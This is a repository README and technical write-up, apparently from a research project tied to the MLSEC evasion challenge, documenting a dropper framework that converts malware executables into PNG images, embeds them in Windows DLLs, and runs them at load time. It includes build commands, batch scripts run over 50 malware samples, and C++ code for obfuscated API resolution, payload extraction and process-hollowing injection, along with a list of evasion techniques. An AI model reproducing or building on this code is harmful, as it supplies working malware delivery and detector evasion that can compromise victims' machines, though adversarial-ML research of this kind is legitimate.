<!-- # Dropper - Advanced Malware Delivery Framework

Multiple ways to embed and deliver executable payloads, including a sophisticated **PNG-embedded dropper system** that hides malware inside image files.

**⚡ NEW: Complete PNG-Embedded Dropper Implementation** - 50 functional dropper DLLs with 100% success rate!

Created for educational and research purposes. Use at your own risk!

## 🎯 Latest Implementation: PNG-Embedded Droppers

A cutting-edge malware delivery system that converts executable binaries directly into PNG images and embeds them as resources in Windows DLL droppers. This approach follows the MLSEC competition methodology for evading machine learning-based malware detectors.

### 🏆 Key Achievements
- ✅ **50 dropper DLLs** successfully generated from malware dataset
- ✅ **100% lossless conversion** (SHA256 hash verified)
- ✅ **Self-contained execution** (no external dependencies)
- ✅ **Advanced obfuscation** (PNG + XOR + Base64 + Resource embedding)
- ✅ **Cross-platform build** (Linux → Windows via MinGW)

### 📊 Project Statistics
| Metric | Value |
|--------|--------|
| **Total Samples Processed** | 50/50 |
| **Success Rate** | 100% |
| **Average Dropper Size** | 0.9 MB |
| **Processing Time** | 132 seconds |
| **Build Errors** | 0 |

## 📁 Repository Structure

### 🆕 PNG Embedding Components
* **`png_droppers_full/`** - Complete set of 50 PNG-embedded dropper DLLs
* **`png_embedded_samples/`** - Test samples and development builds  
* **`image.dll/`** - PNG dropper template with LodePNG integration
* **`utils/`** - Automated processing and build scripts

### 📚 Original Dropper Variants
* **`filesystem.exe/`** - EXE binary that drops payload to filesystem
* **`filesystem.dll/`** - DLL binary that drops payload to filesystem  
* **`inmemory.dll/`** - DLL binary with in-memory payload injection
* **`inmemory.filesystem.dll/`** - Hybrid disk/memory payload dropper
* **`bin.samples/`** - Sample binaries for testing purposes

## 🚀 Quick Start - PNG Droppers

### Prerequisites
```bash
# Install dependencies (Ubuntu/Linux)
sudo apt update
sudo apt install -y mingw-w64 mingw-w64-tools python3-pil python3-numpy
```

### Build All 50 Droppers
```bash
cd utils/
python3 create_full_png_droppers.py
```

### Verify Integrity
```bash
python3 verify_png_integrity.py
```

### Execute on Windows
```cmd
# Load dropper DLL
rundll32.exe dropper_<sample_number>.dll,DllMain
```

## 🔧 PNG Dropper Technical Details

### Architecture Overview
```
Malware Binary → PNG Image → Windows Resource → DLL Dropper → Execution
     ↓              ↓             ↓              ↓            ↓
   (Original)   (Visual Noise)  (Embedded)   (Obfuscated)  (Runtime)
```

## 📊 Complete Pipeline Flowchart

### 🔄 Build Phase (Encoding) → Execution Phase (Decoding)

```mermaid
flowchart TD
    A[Original PE Binary] --> B[XOR Encoding<br/>Key: 0x35]
    B --> C[Base64 Encoding]
    C --> D[Binary-to-PNG Conversion<br/>LodePNG Library]
    D --> E[Embed PNG in Windows Resource<br/>RC File + windres]
    E --> F[Compile DLL Dropper<br/>MinGW Cross-compiler]
    F --> G[📦 Final Dropper.dll]
    
    %% Execution Flow
    G --> H[DLL Loaded by Target Process]
    H --> I[DllMain Entry Point]
    I --> J[Dynamic API Resolution<br/>Obfuscated Function Loading]
    J --> K[Extract PNG Resource<br/>FindResourceW/LoadResource]
    K --> L[XOR Decoding<br/>Key: 0x35]
    L --> M[Base64 Decoding]
    M --> N[PNG-to-PE Conversion<br/>LodePNG Decode]
    N --> O[PE Structure Validation<br/>DOS/NT Headers Check]
    O --> P[Write to Temp File<br/>%TEMP%\temp_[random].exe]
    P --> Q[Execute Payload<br/>CreateProcessA]
    Q --> R[Clean Up Temp File<br/>DeleteFileA after delay]
    
    %% Batch Processing
    S[50 Malware Samples] --> T[Python Batch Processor]
    T --> U[For Each Sample:<br/>PE→XOR→Base64→PNG]
    U --> V[Generate Resource Files]
    V --> W[Automated Build Pipeline]
    W --> X[50 Dropper DLLs Generated]
    X --> Y[SHA256 Hash Verification<br/>Integrity Check]
```

### 🚀 Detailed Step-by-Step Flow

#### 📦 **BUILD PHASE (Encoding):**
1. **Original PE Binary** → Raw malware executable
2. **XOR Encoding** → `data[i] ^ 0x35` for obfuscation
3. **Base64 Encoding** → Convert to ASCII text format
4. **PNG Conversion** → Embed as grayscale PNG image pixels
5. **Resource Embedding** → Compile into Windows RC file
6. **DLL Compilation** → MinGW creates final dropper.dll

#### 🎯 **EXECUTION PHASE (Decoding):**
1. **DLL Load** → Target process loads dropper.dll
2. **Entry Point** → DllMain(DLL_PROCESS_ATTACH)
3. **API Resolution** → Dynamically load Windows APIs
4. **Resource Extraction** → Get embedded PNG resource
5. **XOR Decoding** → Reverse XOR with key 0x35
6. **Base64 Decoding** → Convert back to binary
7. **PNG Decoding** → Extract PE binary from PNG pixels
8. **PE Validation** → Check DOS/NT headers for integrity
9. **Temp File Creation** → Write to system temp directory
10. **Execution** → Launch malware via CreateProcessA
11. **Cleanup** → Remove temp file after 1 second

#### ⚡ **Key Pipeline Features:**
- **Multi-layer Obfuscation**: XOR + Base64 + PNG steganography
- **Dynamic APIs**: Runtime function resolution (anti-static analysis)
- **Integrity Verification**: SHA256 hash validation throughout pipeline
- **Automated Processing**: Batch conversion of 50 samples
- **Clean Execution**: Temporary file cleanup for stealth

#### 🔒 **Evasion Techniques:**
- PNG images appear as innocent graphics files
- XOR+Base64 defeats simple signature detection
- Dynamic API loading evades static analysis
- Temporary execution leaves minimal forensic traces
- Resource embedding hides payload in legitimate PE structure

### Obfuscation Layers
1. **Binary→PNG Conversion**: Malware appears as grayscale image
2. **XOR Encoding**: Bytes XORed with key `0x35`  
3. **Base64 Encoding**: Text-based encoding layer
4. **Resource Embedding**: PNG stored as Windows resource
5. **Dynamic API Loading**: Runtime Windows API resolution

### Execution Flow
```
1. DLL loaded → DllMain() called
2. Resolve Windows APIs dynamically  
3. Extract PNG resource from DLL
4. Decode: Base64 → XOR → PNG → Original Binary
5. Execute payload via temp file method
6. Clean up artifacts
```

## 🛠️ Available Tools & Scripts

### Core Utilities
- **`pe_to_image.py`** - Bidirectional binary/PNG converter
- **`create_full_png_droppers.py`** - Batch processor for all 50 samples
- **`verify_png_integrity.py`** - SHA256 hash verification system
- **`inspect_png_sample.py`** - Visual PNG sample inspector
- **`build_png_droppers.sh`** - Automated DLL compilation

### Generated Assets
- **50 Dropper DLLs** (762 KB - 1.7 MB each)
- **SHA256 Verification Reports**
- **Build Logs & Statistics**
- **PNG Conversion Metadata**

## 📈 Performance & Results

### Conversion Statistics
- **Input Dataset**: 50 malware samples (to_be_evaded_ds_unpacked)
- **Output**: 50 functional dropper DLLs
- **File Size Range**: 733 KB - 1.7 MB
- **Conversion Success**: 100% (50/50)
- **Hash Verification**: ✅ All samples match perfectly

### Build Performance
- **Total Build Time**: 132.1 seconds  
- **Average Per Sample**: 2.6 seconds
- **Compilation Errors**: 0
- **Cross-Platform**: ✅ Linux → Windows

## 🔒 Advanced Evasion Features

### Visual Steganography
- Malware appears as innocent grayscale "noise" images
- No suspicious file extensions or obvious binary signatures
- Natural size variation mimics legitimate image files

### Runtime Obfuscation  
- Dynamic Windows API resolution
- String encoding (API names as integer arrays)
- In-memory execution with minimal disk artifacts
- Automatic temporary file cleanup

### Multi-Layer Encoding
```
Original Binary
    ↓ PNG Conversion (lossless)
    ↓ XOR Encoding (key: 0x35)  
    ↓ Base64 Encoding (text format)
    ↓ Resource Embedding (Windows RC)
Final Dropper DLL
```

## 🎓 Research Background

This implementation is based on research from the **MLSEC adversarial machine learning challenge**, specifically the PNG embedding technique that:

- Converts malware binaries **directly to images** (not traditional steganography)
- Maintains **perfect binary integrity** through lossless conversion
- Provides **superior evasion** compared to raw binary embedding
- Uses **self-contained libraries** (LodePNG) for target compatibility

### Key Research Insight
*"Direct binary-to-image conversion provides better evasion than steganography while maintaining smaller file sizes and perfect binary preservation."*

## 📚 Academic Publications

The research and techniques implemented here have been published in:

1. **"Shallow Security: on the Creation of Adversarial Variants to Evade Machine Learning-Based Malware Detectors"** - ROOTS 2019 [[PDF](paper/roots_shallow.pdf)]

2. **"No Need to Teach New Tricks to Old Malware: Winning an Evasion Challenge with XOR-based Adversarial Samples"** - ROOTS 2020 [[PDF](paper/roots_mlsec20.pdf)]

## 🌐 Competition Usage

This dropper framework has been successfully used in:
- **MLSEC Competition** participation [[Link](https://mlsec.io/)]
- **Adversarial ML Research** [[Blog Post](https://secret.inf.ufpr.br/2020/09/29/adversarial-malware-in-machine-learning-detectors-our-mlsec-2020-secrets/)]

## ⚠️ Important Disclaimer

This project is intended for:
- **Educational purposes** and academic research
- **Authorized penetration testing** and security research  
- **Understanding adversarial ML** techniques and countermeasures

**NOT intended for malicious use.** Use responsibly and only in authorized environments.

## 📄 License & Credits

- **Original Framework**: Marcus Botacin
- **PNG Implementation**: Enhanced with LodePNG library integration
- **LodePNG Library**: Lode Vandevenne (zlib license)
- **Research Basis**: MLSEC challenge methodologies

---

*Last Updated: October 3, 2025*  
*PNG Droppers Generated: 50/50 ✅*  
*Build Success Rate: 100% 🎯* -->

# PNG-Embedded Dropper: Complete Technical Documentation

## Overview
A production-ready dropper system that converts malware executables into PNG image format, embeds them as DLL resources, then reconstructs and executes them at runtime via advanced in-memory PE injection.

**Note**: This is **NOT true steganography**. We are not hiding data within existing images. Instead, we convert raw PE bytes directly into PNG pixel data, then embed the entire PNG file as a binary resource in the dropper DLL.

## Production Files Analysis

### Core Components (`image.dll/` folder)
- **`Source.cpp`** - Runtime PNG decoder & PE injector (C++)
- **`lodepng.cpp/h`** - PNG encoding/decoding library (version 20250506)
- **`Resource.rc`** - Resource embedding script
- **`resource.h`** - Resource definitions

### Utility Scripts (`utils/` folder)  
- **`create_full_png_droppers.py`** - Main batch orchestrator
- **`pe_to_image.py`** - PE→PNG converter
- **`build_single_dropper.sh`** - MinGW cross-compiler script

### Output
- **`png_droppers_no_encoding/`** - 50 production dropper DLLs (733KB - 1.7MB each)

---

## Step-by-Step Program Flow

### Stage 1: Batch Processing Setup
**`create_full_png_droppers.py`** (lines 28-45):
- Reads 50 malware samples from `/home/mihir/Downloads/to_be_evaded_ds_unpacked/`
- Creates output directory `png_droppers_no_encoding/`
- Processes each binary file sequentially

### Stage 2: Binary → PNG Conversion  
**`create_full_png_droppers.py`** calls **`pe_to_image.py`** (lines 67-81):
```python
# Step 1: Convert binary to PNG
result = subprocess.run([
    sys.executable, 
    str(utils_dir / "pe_to_image.py"),
    str(binary_file),
    str(png_file)
], capture_output=True, text=True)
```

**`pe_to_image.py`** performs **lossless binary-to-image conversion**:
- Reads raw PE bytes from malware sample
- Calculates near-square dimensions: `width = ceil(sqrt(pe_size))`
- Pads bytes to fit image dimensions: `pe_data + b'\x00' * padding_needed`
- **Creates grayscale PNG**: `Image.fromarray(image_array, mode='L')` 
  - Each pixel = 1 byte of PE data (0-255 grayscale values)
  - **No data hiding**: PE bytes become literal pixel values
- Saves `.png` + `.png.meta` (stores original size for accurate trimming)

### Stage 3: Dropper Project Assembly
**`create_full_png_droppers.py`** (lines 82-95):
- Copies `image.dll/Dropper/` template → `temp_build_dir/dropper_{sample}/`
- Copies converted PNG → `dropper_{sample}/payload.png`
- Updates project files for compilation

### Stage 4: Resource Embedding (Not Steganography)
**`Resource.rc`**:
```rc
IDR_PNG1 PNG "payload.png"    // Embeds complete PNG file as binary resource
```
This embeds the **entire PNG file** (headers + pixel data + metadata) into the DLL resource section as resource type 256 (PNG), ID 101 (IDR_PNG1).

**Critical distinction**: We are **not** hiding data within an existing image. We are storing a complete PNG file that contains our PE data as its pixel values.

### Stage 5: DLL Compilation
**`create_full_png_droppers.py`** calls **`build_single_dropper.sh`** (lines 96-110):
- MinGW cross-compilation: `x86_64-w64-mingw32-g++`
- Links: `Source.cpp` + `lodepng.cpp` + `Resource.rc`
- Output: `png_droppers_no_encoding/dropper_{sample}.dll`

---

## Runtime Execution Flow

### Stage 6: DLL Loading & API Resolution
**`Source.cpp`** - **`DllMain()`** (lines 161-184):
```cpp
// Dynamic API resolution to evade static analysis
k32 = LoadLibraryA(decode(k32enc,13));  // "Kernel32.dll"
frw = (MyFindResourceW)GetProcAddress(k32,decode(findrsrcenc,14));
mlr = (MyLoadResource)GetProcAddress(k32,decode(loadrsrcenc,13));
// ... resolve all APIs dynamically
run(hModule);  // Launch main dropper function
```

### Stage 7: Resource Extraction
**`Source.cpp`** - **`run()`** function (lines 412-424):
```cpp
// Handle to myself
HMODULE h = (HMODULE)hModule;
// Locate PNG resource (IDR_PNG1 = 101, PNG = 256)
HRSRC r = frw(h,MAKEINTRESOURCE(IDR_PNG1),MAKEINTRESOURCE(PNG));
// Load and lock resource to get PNG file bytes
HGLOBAL rc = mlr(h,r);
void* data = mlor(rc);     // Pointer to complete PNG file bytes
DWORD size = sor(h,r);     // PNG file size (including headers)
```

### Stage 8: Encoding Skip (Clean Pipeline)
**`Source.cpp`** - **`run()`** continues (lines 427-432):
```cpp
// Obfuscation disabled for clean PNG-only pipeline
#ifdef XOR_ENCODE       // DISABLED - commented out in source
    data = XOR(data,size);
#endif
#ifdef BASE64           // DISABLED - commented out in source  
    data = base64decode(data,&size);
#endif
```

### Stage 9: PNG Decoding & PE Reconstruction
**`Source.cpp`** - **`png_to_pe()`** function (lines 355-407):

This is the **critical reversal step** that reconstructs the original PE from PNG pixel data:

```cpp
#ifdef PNG_DECODE       // ENABLED
    // Step 1: Decode PNG using lodepng library  
    unsigned char* image_data;
    unsigned width, height;
    unsigned error = lodepng_decode_memory(&image_data, &width, &height, 
                                         png_data, png_size, LCT_GREY, 8);
    
    if (error) {
        *pe_size = 0;
        return NULL;  // PNG decode failed
    }
    
    // Step 2: Extract PE bytes from pixel data
    size_t total_image_size = width * height;  // Total pixels = total PE bytes
    
    // Step 3: Allocate buffer and copy pixel data
    void* pe_data = mm(total_image_size);      // Malloc PE buffer
    memcpy(pe_data, image_data, total_image_size);  // Copy pixels → PE bytes
    free(image_data);  // Free lodepng memory
    
    // Step 4: PE validation and size detection
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_data;
    if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {  // Check "MZ" signature
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)pe_data + dos_header->e_lfanew);
        if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {  // Check "PE" signature
            // Use PE header's SizeOfImage for accurate size (removes padding)
            *pe_size = nt_headers->OptionalHeader.SizeOfImage;
        }
    }
#endif
```

**Key PNG Decoding Details**:
- **`LCT_GREY, 8`**: Decodes as 8-bit grayscale (each pixel = 1 byte)
- **1:1 mapping**: Each PNG pixel value becomes 1 PE byte (lossless conversion)
- **Size calculation**: `width × height = total_pixels = total_PE_bytes`
- **Padding removal**: PE header's `SizeOfImage` provides true PE size vs padded image size
- **Memory management**: lodepng allocates `image_data`, we copy to our `pe_data` buffer and free lodepng's memory

### Stage 10: In-Memory PE Injection
**`Source.cpp`** - **`launch()`** → **`runPE64()`** (lines 188-387):
```cpp
// Create suspended target process (typically current executable)
CreateProcess(NULL, wszArgsBuffer, NULL, NULL, TRUE, CREATE_SUSPENDED, ...);

// Allocate memory at PE's preferred ImageBase address
LPVOID lpImageBase = VirtualAllocEx(lpPI->hProcess, 
                                   (LPVOID)lpNTHeader->OptionalHeader.ImageBase,
                                   lpNTHeader->OptionalHeader.SizeOfImage,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write PE headers to target process
WriteProcessMemory(lpPI->hProcess, lpImageBase, lpImage, 
                  lpNTHeader->OptionalHeader.SizeOfHeaders, NULL);

// Map all PE sections into target process memory
for (SIZE_T iSection = 0; iSection < lpNTHeader->FileHeader.NumberOfSections; ++iSection) {
    // Calculate section virtual address and copy section data
    WriteProcessMemory(lpPI->hProcess, section_va, section_data, section_size, NULL);
}

// Update entry point and resume execution
stCtx.Rcx = (DWORD64)lpImageBase + lpNTHeader->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(lpPI->hThread, &stCtx);
ResumeThread(lpPI->hThread);  // Execute injected PE
```

---

## Complete Data Transformation Chain

```
Original Malware.exe (raw PE bytes)
    ↓ pe_to_image.py
Grayscale PNG (1 byte per pixel, PE bytes as pixel values, padded to square)
    ↓ create_full_png_droppers.py  
Resource.rc embeds complete PNG file → DLL compilation
    ↓ build_single_dropper.sh (MinGW cross-compiler)
dropper_X.dll (contains PNG file in IDR_PNG1 resource section)
    ↓ Runtime: DLL load triggers DllMain() → run()
FindResource/LoadResource extracts complete PNG file bytes
    ↓ lodepng_decode_memory(LCT_GREY, 8) 
Raw pixel array (grayscale values 0-255 = original PE bytes + padding)
    ↓ PE header validation & SizeOfImage-based trimming
Original PE bytes restored (padding removed)
    ↓ runPE64() advanced process hollowing
CreateProcess(SUSPENDED) → VirtualAllocEx → WriteProcessMemory → ResumeThread
    ↓ 
Malware executes in target process memory space
```

## Technical Implementation Details

### PNG Conversion Method (Not Steganography)
- **Direct byte mapping**: PE byte value becomes PNG pixel grayscale value (0-255)
- **Lossless preservation**: PNG grayscale mode preserves exact byte values
- **Square optimization**: Near-square dimensions minimize file size overhead
- **No carrier image**: We create the PNG from scratch, not hiding within existing images
- **Metadata storage**: Original size stored in `.png.meta` for accurate reconstruction

### Evasion Techniques
- **Dynamic API resolution**: All Windows APIs resolved at runtime via `GetProcAddress()`
- **String obfuscation**: API names stored as integer arrays, decoded at runtime
- **200+ dead exports**: Fake export table mimics legitimate system DLLs
- **In-memory execution**: Advanced process hollowing (no disk writes)
- **Resource embedding**: Malware appears as PNG image resources (but not hidden within images)

### Build Pipeline Efficiency  
- **Batch processing**: Processes 50 samples in 84 seconds (~1.7s per dropper)
- **Template-based**: Single `image.dll/Dropper/` template for all variants
- **Cross-compilation**: MinGW produces Windows DLLs on Linux
- **Automated workflow**: Complete PE → PNG → DLL pipeline

## Production Results
✅ **50 dropper DLLs successfully created**  
✅ **Size range**: 733KB - 1.7MB (includes dropper runtime + lodepng library + PNG payload)  
✅ **100% success rate** in batch processing  
✅ **Clean PNG embedding verified** (PNG headers confirmed at consistent offsets)

## Key Distinctions

### What This IS:
- **PNG-based PE packing**: Converting PE executables into PNG format for storage
- **Resource embedding**: Storing PNG files as DLL resources
- **Lossless binary conversion**: PE ↔ PNG conversion preserves all data
- **Advanced process injection**: In-memory PE execution via process hollowing

### What This is NOT:
- **Steganography**: We don't hide data within existing images
- **Image manipulation**: We don't modify existing PNG files
- **Visual deception**: The PNG doesn't look like a normal image (it's grayscale noise)
- **Carrier-based hiding**: No host image is used to conceal the payload

This implementation demonstrates advanced malware packing techniques using PNG as a binary storage format combined with sophisticated runtime PE injection for educational cybersecurity research.